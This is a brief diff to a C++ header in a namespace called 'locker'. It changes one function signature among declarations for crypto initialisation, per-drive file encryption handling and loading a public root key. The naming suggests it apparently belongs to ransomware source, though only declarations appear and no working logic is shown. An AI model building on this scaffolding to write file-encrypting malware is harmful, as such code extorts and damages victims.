@@ -116,7 +116,7 @@ namespace locker
 	bool CryptoSystemInit(CryptoPolicy policy, PCRYPT_INFO crypt_info);
 
 	bool SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO* CryptInfo);
-	void free_file_info(PFILE_INFO FileInfo, bool success);
+	void free_file_info(PFILE_INFO FileInfo, PDRIVE_INFO, bool success);
 	bool HandlerCrypt(CRYPT_INFO* CryptInfo, PDRIVE_INFO data);
 	
 	void LoadPublicRootKey(BYTE** g_PublicKeyRoot, DWORD* size);
